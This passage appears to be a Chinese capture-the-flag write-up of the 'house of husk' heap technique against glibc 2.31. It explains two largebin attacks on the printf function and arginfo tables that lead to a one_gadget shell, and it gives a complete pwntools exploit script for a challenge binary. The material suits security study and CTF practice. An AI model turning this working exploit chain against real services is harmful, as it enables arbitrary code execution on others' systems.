    edit(0,b'\x00'*0x420+p64(0)+p64(0x41)) #6c0
    edit(1,b'\x00'*0x340+p64(0)+p64(0x41)) #af0
    delete(3)
    delete(4)
    show(4)
    heap_addr = u64(p.recvuntil("\x55")[-6:].ljust(8,b"\x00"))-0x6d0 #+0x290
    li('heap_addr = '+hex(heap_addr))
​​
##### largebin attack：
首先申请四个堆块准备largebin attack，先将chunk7送入largebin
    add(0x448,5, b'fff') #
    add(0x500,6, b'ggg')
    add(0x458,7, b'hhh') #
    add(0x500,8, b'iii')
    delete(7) #ub
    add(0x500,9,b'jjj') #chunk7 -> large
###### 第一次largebin attack，使__printf_function_table处非零
    ###__printf_function_table != 0
    delete(5) #ub
    printf_function_table = libc_base+0x1f1318
    pl=p64(libc_base+0x1ecfe0)+p64(libc_base+0x1ecfe0)+p64(heap_addr+0x1350)+p64(printf_function_table-0x20)
    # main_arena+1120  main_arena+1120
    # chunk7-0x20      __printf_function_table-0x20
    edit(7,pl)
    add(0x500,10,'kkk') #attack
‍
###### 第二次largebin attack，在__printf_arginfo_table处写入chunk5/11的地址
    ###__printf_arginfo_table 
    add(0x448,11,'lll') #rl chunk5
    delete(11) #ub
    printf_arginfo_table = libc_base+0x1ed7b0
    pl=p64(libc_base+0x1ecfe0)+p64(libc_base+0x1ecfe0)+p64(heap_addr+0x1350)+p64(printf_arginfo_table-0x20)
    edit(7,pl)
    add(0x500,12,'mmm') #attack
​​​​
​​​​
‍
最后再修改spec处为onegadget（注意大小写）
​​
    ogs = [0xe3afe,0xe3b01,0xe3b04]
    og = libc_base + ogs[1]
    pl=b'a'*((ord('X'))*8-0x10)+p64(og)
    edit(11,pl)
‍
##### 触发流程：
    sla('>> ','5')
​​
###### main+162 prinft
‍
###### __vfprintf_internal
‍
###### printf_positional
‍
###### _IO_default_xsputn
这里会有__printf_function_table非空的检查
​​
‍
###### printf_positional
‍
###### __parse_one_specmb
这里会对__printf_modifier_table是否为0进行一个check，非0可能会出现些问题，所以尽量保证构造时不影响其值
​​
‍
下面会将&__printf_arginfo_table地址赋给rcx，再将[rcx+rdx*8]的值（即chunk5/11地址+0x58×8）赋给rax，并最终跳转到rax
​​
​​
‍
###### execvpe
​​
‍
##### 完整exp：
    #encoding = utf-8
    from pwn import *
    from pwnlib.rop import *
    from pwnlib.context import *
    from pwnlib.fmtstr import *
    from pwnlib.util.packing import *
    from pwnlib.gdb import *
    from ctypes import *
    import os
    import sys
    import time
    import base64
    context.os = 'linux'
    context.arch = 'amd64'
    context.log_level = "debug"
    name = './pwn'
    debug = 0
    if debug:
        p = remote('127.0.0.1',8000)
    else:
        p = process(name)
    #libcso = '/lib/x86_64-linux-gnu/libc-2.31.so'
    libcso = './libc-2.31.so'
    libc = ELF(libcso)
    #libc = elf.libc
    elf = ELF(name)
    s       = lambda data               :p.send(data)
    sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
    sl      = lambda data               :p.sendline(data)
    sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
    r       = lambda num                :p.recv(num)
    ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
    itr     = lambda                    :p.interactive()
    uu32    = lambda data,num           :u32(p.recvuntil(data)[-num:].ljust(4,b'\x00'))
    uu64    = lambda data,num           :u64(p.recvuntil(data)[-num:].ljust(8,b'\x00'))
    leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
    l64     = lambda      :u64(p.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
    l32     = lambda      :u32(p.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
    li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
    ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')
    context.terminal = ['gnome-terminal','-x','sh','-c']
    add_idx = 1
    delete_idx = 2
    show_idx = 3
    edit_idx = 4
    def dbg():
       gdb.attach(proc.pidof(p)[0])
       pause()
    bss = elf.bss()
    li('bss = '+hex(bss))
    def choice(cho):
        sla('>> ',cho)
    def add(size,idx,con):
        choice(add_idx)
        sla('HOw much?\n',size)
        sla('which?\n',idx)
        p.sendlineafter('Content:\n',con)
    def delete(idx):
        choice(delete_idx)
        sla('which one?\n',idx)
    def show(idx):
        choice(show_idx)
        sla('which one?\n',idx)
    def edit(idx,con):
        choice(edit_idx)
        sla('which one?\n',idx)
        p.sendafter('content:\n',con)
    add(0x500,0,b'aaa')
    add(0x500,1,b'bbb')
    delete(0)
    show(0)
    libc_base=l64()-96-0x10-libc.sym['__malloc_hook']
    li('libc_base = '+hex(libc_base))
    delete(1)
    add(0x420,2,b'ccc')
    add(0x420,3,b'ddd')
    add(0x420,4,b'eee')
    edit(0,b'\x00'*0x420+p64(0)+p64(0x41)) #6c0
    edit(1,b'\x00'*0x340+p64(0)+p64(0x41)) #af0
    delete(3)
    delete(4)
    show(4)
    heap_addr = u64(p.recvuntil("\x55")[-6:].ljust(8,b"\x00"))-0x6d0 #+0x290
    li('heap_addr = '+hex(heap_addr))
    add(0x448,5, b'fff') #
    add(0x500,6, b'ggg')
    add(0x458,7, b'hhh') #
    add(0x500,8, b'iii')
    delete(7) #ub
    add(0x500,9,b'jjj') #chunk7 -> large
    ###__printf_function_table != 0
    delete(5) #ub
    printf_function_table = libc_base+0x1f1318
    pl=p64(libc_base+0x1ecfe0)+p64(libc_base+0x1ecfe0)+p64(heap_addr+0x1350)+p64(printf_function_table-0x20)
    # main_arena+1120  main_arena+1120
    # chunk7-0x20      __printf_function_table-0x20
    edit(7,pl)
    add(0x500,10,'kkk') #attack
    ###__printf_arginfo_table 
    add(0x448,11,'lll') #rl chunk5
    delete(11) #ub
    printf_arginfo_table = libc_base+0x1ed7b0
    pl=p64(libc_base+0x1ecfe0)+p64(libc_base+0x1ecfe0)+p64(heap_addr+0x1350)+p64(printf_arginfo_table-0x20)
    edit(7,pl)
    add(0x500,12,'mmm') #attack
    ogs = [0xe3afe,0xe3b01,0xe3b04]
    og = libc_base + ogs[1]
    pl=b'a'*((ord('X'))*8-0x10)+p64(og)
    printf(ord('X')-2)
    edit(11,pl)
    #dbg()
    sla('>> ','5')
    itr()
‍
‍
#### 参考：
> [house-of-husk学习笔记-安全客 - 安全资讯平台
> (anquanke.com)](https://www.anquanke.com/post/id/202387#h2-8)
>
> [关于house of husk的学习总结 | ZIKH26's
> Blog](https://zikh26.github.io/posts/6c83c2a2.html)
‍